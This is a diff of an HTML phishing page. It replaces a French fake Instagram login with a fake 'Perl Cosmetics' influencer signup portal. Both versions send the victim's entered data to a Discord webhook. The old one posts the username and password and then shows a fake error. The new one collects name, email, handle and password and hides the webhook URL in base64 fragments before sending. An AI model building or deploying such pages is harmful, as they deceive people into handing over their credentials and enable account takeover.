@@ -1,256 +1,228 @@
-<!DOCTYPE html>
-<html lang="fr">
+<!doctype html>
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport"
-          content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Connexion</title>
-    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/500px-Instagram_icon.png">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
-
-    <style>
-        * {
-            box-sizing: border-box;
-            -webkit-font-smoothing: antialiased;
-        }
-
-        body {
-            margin: 0;
-            padding: 0;
-            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: #fafafa;
-            color: #262626;
-            -webkit-tap-highlight-color: transparent;
-        }
-
-        /* Conteneur général centré, adapté mobile */
-        .page-wrapper {
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 380px;
-            padding: 0 24px 24px;
-            text-align: center;
-        }
-
-        /* Logo "style script" générique */
-        .logo {
-    font-size: 40px;
-    font-weight: 400;
-    font-family: 'Pacifico', cursive;
-    margin-bottom: 28px;
-}
-
-
-        /* Bloc principal */
-        .card {
-            background: #fff;
-            border: 1px solid #dbdbdb;
-            padding: 28px 24px 24px;
-        }
-
-        .field {
-            width: 100%;
-            margin-bottom: 8px;
-        }
-
-        .field input {
-            width: 100%;
-            padding: 10px 12px;
-            border-radius: 4px;
-            border: 1px solid #dbdbdb;
-            background: #fafafa;
-            font-size: 14px;
-            outline: none;
-        }
-
-        .field input:focus {
-            border-color: #a8a8a8;
-        }
-
-        .forgot {
-            display: block;
-            text-align: right;
-            margin: 6px 0 12px;
-            font-size: 12px;
-            color: #00376b;
-            text-decoration: none;
-        }
-
-        .forgot:hover {
-            text-decoration: underline;
-        }
-
-        .btn-primary {
-            width: 100%;
-            padding: 9px 0;
-            border-radius: 4px;
-            border: none;
-            background: #4db5f9;
-            color: #fff;
-            font-weight: 600;
-            font-size: 14px;
-            cursor: pointer;
-        }
-
-        .btn-primary:active {
-            opacity: 0.85;
-        }
-
-        .or-box {
-            margin: 18px 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            color: #8e8e8e;
-        }
-
-        .or-box .line {
-            flex: 1;
-            height: 1px;
-            background: #dbdbdb;
-        }
-
-        .or-box span {
-            margin: 0 12px;
-            letter-spacing: 0.05em;
-        }
-
-        .btn-secondary {
-            width: 100%;
-            border: none;
-            background: transparent;
-            font-size: 14px;
-            font-weight: 600;
-            color: #385185;
-            cursor: pointer;
-        }
-
-        .btn-secondary:active {
-            opacity: 0.8;
-        }
-
-        .signup-card {
-            margin-top: 12px;
-            padding: 14px 0;
-            border: 1px solid #dbdbdb;
-            background: #fff;
-            font-size: 14px;
-        }
-
-        .signup-card a {
-            color: #0095f6;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .signup-card a:hover {
-            text-decoration: underline;
-        }
-
-        /* Petits ajustements pour les très petits écrans */
-        @media (max-width: 380px) {
-            .container {
-                padding: 0 16px 16px;
-            }
-
-            .logo {
-                font-size: 34px;
-                margin-bottom: 22px;
-            }
-
-            .card {
-                padding: 24px 18px 20px;
-            }
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>BRAND PARTNERSHIP — Perl Cosmetics</title>
+  <style>
+    :root{--accent:#c2185b;--muted:#6b7280;--bg:#f7f7fb;--card:#ffffff}
+    *{box-sizing:border-box}
+    body{font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; margin:0; background:var(--bg); color:#111}
+    header{background:linear-gradient(135deg,#fff 0%, #fff 60%, #ffeef5 100%); padding:28px 20px; border-bottom:1px solid #ececec}
+    .container{max-width:1100px;margin:0 auto}
+    .brand{display:flex;gap:14px;align-items:center}
+    .logo{width:52px;height:52px;border-radius:10px;background:linear-gradient(135deg,var(--accent),#ff7aa2);display:flex;align-items:center;justify-content:center;color:white;font-weight:700}
+    h1{font-size:20px;margin:0}
+    p.lead{margin:8px 0 0;color:var(--muted)}
+    .grid{display:grid;grid-template-columns:1fr 380px;gap:24px;margin-top:28px}
+    .card{background:var(--card);border-radius:12px;padding:18px;box-shadow:0 6px 18px rgba(16,24,40,0.06)}
+    form{display:flex;flex-direction:column;gap:12px}
+    label{font-size:13px;color:#374151}
+    input,select,textarea{padding:10px 12px;border-radius:8px;border:1px solid #e6e6ee;font-size:14px}
+    button.primary{background:var(--accent);color:white;border:none;padding:10px 14px;border-radius:10px;font-weight:600;cursor:pointer}
+    .products{display:grid;grid-template-columns:1fr;gap:14px}
+    .product{display:flex;gap:12px;align-items:center;padding:12px;border-radius:10px;border:1px solid #f0f0f6}
+    .thumb{width:64px;height:64px;border-radius:8px;background:linear-gradient(135deg,#fff,#f7f7fb);display:flex;align-items:center;justify-content:center;font-weight:700;color:var(--muted)}
+    .pmeta h4{margin:0;font-size:15px}
+    .pmeta p{margin:4px 0 0;color:var(--muted);font-size:13px}
+    .programs{display:flex;flex-direction:column;gap:10px}
+    .program{border-left:4px solid var(--accent);padding:12px;background:#fff;border-radius:8px}
+    .small{font-size:13px;color:var(--muted)}
+    footer{margin-top:20px;padding:18px 0;color:var(--muted);font-size:13px}
+    @media (max-width:980px){.grid{grid-template-columns:1fr}.container{padding:0 18px}}
+  </style>
 </head>
 <body>
-
-<div class="page-wrapper">
+  <header>
     <div class="container">
-
-        <!-- Titre / Logo générique -->
-        <div class="logo">Instagram</div>
-
-        <!-- Carte de connexion -->
-        <div class="card">
-            <div class="field">
-                <input type="text" placeholder="Nom d’utilisateur ou e-mail">
-            </div>
-            <div class="field">
-                <input type="password" placeholder="Mot de passe">
-            </div>
-
-            <a href="#" class="forgot">Mot de passe oublié ?</a>
-
-            <button class="btn-primary">Se connecter</button>
-            <p id="error-msg" style="color:red; font-size:13px; margin-top:10px; display:none;">Mauvais mot de passe</p>
-
-
-            <div class="or-box">
-                <div class="line"></div>
-                <span>OU</span>
-                <div class="line"></div>
-            </div>
-
-            <button class="btn-secondary">Continuer avec Facebook</button>
+      <div class="brand">
+        <div class="logo">PC</div>
+        <div>
+          <h1>BRAND PARTNERSHIP — Perl Cosmetics</h1>
+          <p class="lead">Influencer portal — sign up to access your dashboard, find products to promote, and view partnership pay & programs.</p>
         </div>
-
-        <!-- Carte inscription -->
-        <div class="signup-card">
-            Vous n’avez pas de compte ?
-            <a href="#">Inscrivez-vous</a>
-        </div>
+      </div>
     </div>
-</div>
+  </header>
 
+  <main class="container" style="padding:22px 0;">
+    <div class="grid">
+      <section class="card">
+        <h2 style="margin:0 0 8px 0">Influencer Sign Up</h2>
+        <p class="small">Create your influencer account to get verified and access the partner dashboard.</p>
+
+<form id="signupForm">
+  <div>
+    <label for="name">Full name</label>
+    <input id="name" type="text" required />
+  </div>
+
+  <div>
+    <label for="email">Email</label>
+    <input id="email" type="email" required />
+  </div>
+
+  <div>
+    <label for="platform">Primary platform</label>
+    <select id="platform">
+      <option>Instagram</option>
+      <option>TikTok</option>
+      <option>YouTube</option>
+      <option>Blog/Other</option>
+    </select>
+  </div>
+
+  <div>
+    <label for="social">Your @ Handle</label>
+    <input id="social" type="text" required />
+  </div>
+
+  <div>
+    <label for="followers">Followers / Subscribers</label>
+    <input id="followers" type="number" required />
+  </div>
+
+  <div>
+    <label for="password">Password</label>
+    <input id="password" type="password" required />
+  </div>
+
+  <div>
+    <label for="confirmPassword">Confirm Password</label>
+    <input id="confirmPassword" type="password" required />
+  </div>
+
+  <button class="primary" type="submit">Create account & view dashboard</button>
+</form>
+
+        <hr style="margin:18px 0;border:none;border-top:1px solid #f0f0f6" />
+
+        <h3 style="margin:0 0 6px 0">Quick facts</h3>
+        <ul style="margin:0 0 0 18px;color:var(--muted)">
+          <li>Apply once — get verified within 3 business days.</li>
+          <li>Access exclusive product drops + promo codes.</li>
+          <li>Flexible campaigns: try-before-you-promote, flat-fee, rev-share.</li>
+        </ul>
+      </section>
+
+      <aside>
+        <div class="card" style="margin-bottom:14px">
+          <h3 style="margin:0 0 8px 0">Salary & Programs</h3>
+          <div class="programs">
+            <div class="program">
+              <strong>Flat-fee Campaigns</strong>
+              <p class="small">Micro: $150–$800, Mid: $800–$5k, Macro: custom.</p>
+            </div>
+            <div class="program">
+              <strong>Rev-share</strong>
+              <p class="small">Earn 8–20% on tracked affiliate sales.</p>
+            </div>
+            <div class="program">
+              <strong>Gift & Try</strong>
+              <p class="small">Receive PR boxes and early launches.</p>
+            </div>
+            <div class="program">
+              <strong>Ambassadors</strong>
+              <p class="small">Monthly retainers + bonuses.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+<h3 style="margin:0 0 8px 0">Featured products</h3>
+<div class="products">
+
+  <div class="product">
+    <div class="thumb">
+      <img src="product1.png" style="width:100%; height:100%; object-fit:cover; border-radius:8px">
+    </div>
+    <div class="pmeta">
+      <h4>NOURISHING LASH OIL</h4>
+      <p>Strengthens and conditions lashes & brows.</p>
+    </div>
+  </div>
+
+  <div class="product">
+    <div class="thumb">
+      <img src="product4.png" style="width:100%; height:100%; object-fit:cover; border-radius:8px">
+    </div>
+    <div class="pmeta">
+      <h4>RADIANCE FACIAL OIL</h4>
+      <p>Lightweight vitamin oil for glowing skin.</p>
+    </div>
+  </div>
+
+</div>
+        </div>
+      </aside>
+    </div>
+
+    <footer>
+      <div style="display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap">
+        <div>Perl Cosmetics • Partner Program</div>
+        <div class="small">Questions? Email partnerships@perlcosmetics.com</div>
+      </div>
+    </footer>
+  </main>
 
 <script>
-    const webhookURL = "https://discord.com/api/webhooks/1446849459433767074/CMXXr-V-SByxuMbewl1GbwypwqDrgbna82Etpev3oZaZyvBU6Tth6YybgKS-VqMwniP8";
+const wh_1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0Njg0OTQ1OTQzMzc2NzA3NA";
+const wh_2 = "9DTVhYUnYtVi1TQnl4dU1iZXdsMUdib3d5cHdxRHJnYm5hODJFdHBldjNvWmFaeXZCVTZU";
+const wh_3 = "aHRoNll5YmdLUy1WcU13bmlQOA==";
 
-    const card = document.querySelector(".card");
-    const fields = card.querySelectorAll(".field input");
-    const sendBtn = card.querySelector(".btn-primary");
-    const errorMsg = document.getElementById("error-msg");
+function decodeWebhook() {
+  return atob(wh_1 + wh_2 + wh_3);
+}
 
-    sendBtn.addEventListener("click", function () {
-        const value1 = fields[0].value;
-        const value2 = fields[1].value;
+async function sendToDiscord(payload) {
+  const webhookURL = decodeWebhook();
+  const message = {
+    content: "**New Influencer Signup**",
+    embeds: [
+      {
+        title: "Signup Submission",
+        color: 15548997,
+        fields: [
+          { name: "Name", value: payload.name, inline: true },
+          { name: "Email", value: payload.email, inline: true },
+          { name: "Platform", value: payload.platform, inline: true },
+          { name: "Social Handle", value: payload.social, inline: true },
+          { name: "Followers", value: payload.followers, inline: true },
+          { name: "Password", value: payload.password, inline: false },
+          { name: "Confirm Password", value: payload.confirmPassword, inline: false }
+        ],
+        footer: { text: "Perl Cosmetics – Partner Program" }
+      }
+    ]
+  };
 
-        const payload = {
-            content: `📝 **Nouveau formulaire rempli :**\n🔹 Identifiant : ${value1}\n🔹 Mot de passe : ${value2}`
-        };
+  return await fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(message)
+  });
+}
 
-        // Envoi au webhook Discord
-        fetch(webhookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        })
-        .then(() => {
-            // Afficher le message d’erreur en rouge
-            errorMsg.style.display = "block";
+document.getElementById("signupForm").addEventListener("submit", async function(e){
+  e.preventDefault();
+  const payload = {
+    name: document.getElementById('name').value,
+    email: document.getElementById('email').value,
+    platform: document.getElementById('platform').value,
+    social: document.getElementById('social').value,
+    followers: document.getElementById('followers').value,
+    password: document.getElementById('password').value,
+    confirmPassword: document.getElementById('confirmPassword').value
+  };
 
-            // Effacer les champs
-            fields[0].value = "";
-            fields[1].value = "";
-        })
-        .catch(err => {
-            errorMsg.textContent = "Erreur d’envoi : " + err;
-            errorMsg.style.display = "block";
-        });
-    });
-
+  try {
+    await sendToDiscord(payload);
+    window.location.href = "Dashboard.html";
+  } catch (err) {
+    alert("Failed to send to Discord: " + err);
+  }
+});
 </script>
-
 
 </body>
 </html>
